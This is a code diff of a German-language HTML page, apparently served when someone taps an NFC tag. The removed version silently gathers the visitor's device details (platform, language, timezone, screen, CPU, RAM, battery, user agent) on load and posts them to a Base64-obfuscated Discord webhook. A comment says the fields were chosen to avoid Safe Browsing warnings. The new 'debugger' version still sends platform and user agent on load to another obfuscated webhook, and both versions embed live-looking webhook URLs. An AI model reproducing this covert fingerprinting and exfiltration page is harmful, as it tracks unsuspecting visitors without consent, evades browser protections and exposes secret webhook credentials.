@@ -3,95 +3,90 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NFC Trigger</title>
+    <title>NFC Trigger Debugger</title>
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
+            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
             background-color: #0f172a;
-            color: #ffffff;
-            text-align: center;
+            color: #f8fafc;
+            padding: 16px;
+            margin: 0;
         }
-        .card {
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
             background: #1e293b;
-            padding: 2rem;
-            border-radius: 16px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
-            max-width: 350px;
-            width: 90%;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
         }
-        .status {
-            font-size: 1.2rem;
-            margin-top: 10px;
+        h2 { margin-top: 0; color: #38bdf8; font-size: 1.2rem; }
+        #log {
+            background: #020617;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid #334155;
+            white-space: pre-wrap;
+            word-break: break-all;
+            font-size: 12px;
+            line-height: 1.6;
+            max-height: 450px;
+            overflow-y: auto;
         }
+        .success { color: #4ade80; }
+        .error { color: #f87171; }
+        .info { color: #fbbf24; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div id="icon" style="font-size: 3rem;">⏳</div>
-        <div id="status" class="status">Sende Nachricht...</div>
+    <div class="container">
+        <h2>🛠️ NFC Webhook Live Debugger</h2>
+        <div id="log">Starte Ablauf...\n</div>
     </div>
 
     <script>
-        // Füge hier deine BASE64-verschlüsselte Webhook-URL ein!
-        const ENCODED_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3MTQ2NzU3OTMyNzc3ODgyNi82UXVFUjFlOTUzUUZJLUhHcWJfTTRYdFNTZ3lhcXZNSHhuNEVTeDNsVHAxcTl6OWJjZXlTU1pCRE1jMHRBZTlNLWNPMw==";
+        // Dein Base64 Webhook
+        const ENCODED_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1NDU3MzE1MTk3ODEyNzQyMy9oUlI2OUpVdXFCbG5EaU1DSGdLcE1iNU4xaUpyYkRkV0tTTmR5RVRPdzF3bVlOU1VBN0RFV3FtWTBsNXZRTGExRlZlbg==";
 
-        function getWebhookUrl() {
-            try {
-                return atob(ENCODED_WEBHOOK);
-            } catch (e) {
-                return "";
-            }
+        function log(msg, type = '') {
+            const logDiv = document.getElementById('log');
+            const time = new Date().toLocaleTimeString();
+            let prefix = `[${time}] `;
+            if (type === 'error') prefix += '❌ ';
+            else if (type === 'success') prefix += '✅ ';
+            else if (type === 'info') prefix += 'ℹ️ ';
+            
+            const span = document.createElement('span');
+            if (type) span.className = type;
+            span.textContent = prefix + msg + '\n';
+            logDiv.appendChild(span);
         }
 
-        async function collectAndSend() {
-            // Akku-Daten (falls verfügbar)
-            let batteryInfo = "N/A";
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    batteryInfo = `${Math.round(battery.level * 100)}\% (${battery.charging ? "Lädt" : "Entlädt"})`;
-                } catch (e) {}
+        async function runDebug() {
+            log("1. Dekodiere Base64-String...", "info");
+            let webhookUrl = "";
+            try {
+                webhookUrl = atob(ENCODED_WEBHOOK).trim();
+                log("   Ziel-URL: " + webhookUrl.substring(0, 45) + "...");
+            } catch (e) {
+                log("   Base64 Dekodierung fehlgeschlagen: " + e.message, "error");
+                return;
             }
 
-            // Normale Standard-Browserdaten (lösen keine Safe-Browsing Warnung aus)
-            const screenRes = `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`;
-            const viewport = `${window.innerWidth}x${window.innerHeight}`;
-            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unbekannt";
-            const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Kerne` : "Unbekannt";
-            const ram = navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : "N/A";
-            const isTouch = ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? "Ja" : "Nein";
-
+            log("2. Erstelle JSON-Payload...", "info");
             const payload = {
-                username: "NFC Scanner Bot",
+                username: "NFC Debug Bot",
                 embeds: [{
-                    title: "🚨 NFC-Karte gescannt!",
+                    title: "🧪 NFC Test gesendet!",
                     color: 3447003,
-                    timestamp: new Date().toISOString(),
                     fields: [
-                        { name: "📱 System", value: navigator.platform || "Unbekannt", inline: true },
-                        { name: "🌐 Sprache", value: navigator.language || "Unbekannt", inline: true },
-                        { name: "⏰ Zeitzone", value: timeZone, inline: true },
-
-                        { name: "🖥️ Auflösung", value: screenRes, inline: true },
-                        { name: "📐 Viewport", value: viewport, inline: true },
-                        { name: "👆 Touchscreen", value: isTouch, inline: true },
-
-                        { name: "⚡ CPU Cores", value: cores, inline: true },
-                        { name: "🧠 RAM", value: ram, inline: true },
-                        { name: "🔋 Akku", value: batteryInfo, inline: true },
-
-                        { name: "🌐 Browser User-Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
+                        { name: "Plattform", value: navigator.platform || "Unbekannt", inline: true },
+                        { name: "User-Agent", value: navigator.userAgent || "Unbekannt", inline: false }
                     ]
                 }]
             };
 
-            const webhookUrl = getWebhookUrl();
-
+            log("3. Sende HTTP POST an Discord...", "info");
             try {
                 const response = await fetch(webhookUrl, {
                     method: "POST",
@@ -99,19 +94,28 @@
                     body: JSON.stringify(payload)
                 });
 
+                log(`   HTTP Response Status: ${response.status} (${response.statusText})`, response.ok ? "success" : "error");
+
+                const responseText = await response.text();
+                if (responseText) {
+                    log(`   Discord Antwort-Text: ${responseText}`, response.ok ? "info" : "error");
+                }
+
                 if (response.ok) {
-                    document.getElementById("icon").innerText = "✅";
-                    document.getElementById("status").innerText = "Erfolgreich gesendet!";
+                    log("🎉 ERFOLG: Nachricht wurde an Discord übermittelt!", "success");
                 } else {
-                    throw new Error("Discord Fehler " + response.status);
+                    log(`⚠️ Discord hat die Anfrage abgelehnt (HTTP-Code ${response.status}).`, "error");
+                    if (response.status === 404 || response.status === 401) {
+                        log("💡 URSACHE: Der Webhook existiert in Discord nicht mehr! Bitte erstelle in Discord einen NEUEN Webhook, wandle den Link in Base64 um und trage ihn oben ein.", "info");
+                    }
                 }
             } catch (err) {
-                document.getElementById("icon").innerText = "❌";
-                document.getElementById("status").innerText = "Fehler beim Senden.";
+                log("   Netzwerk- oder CORS-Fehler: " + err.message, "error");
+                log("💡 MÖGLICHE URSACHE: Ein AdBlocker/Browser-Schutz blockiert 'fetch' oder es besteht keine Internetverbindung.", "info");
             }
         }
 
-        window.addEventListener('DOMContentLoaded', collectAndSend);
+        window.addEventListener('DOMContentLoaded', runDebug);
     </script>
 </body>
 </html>
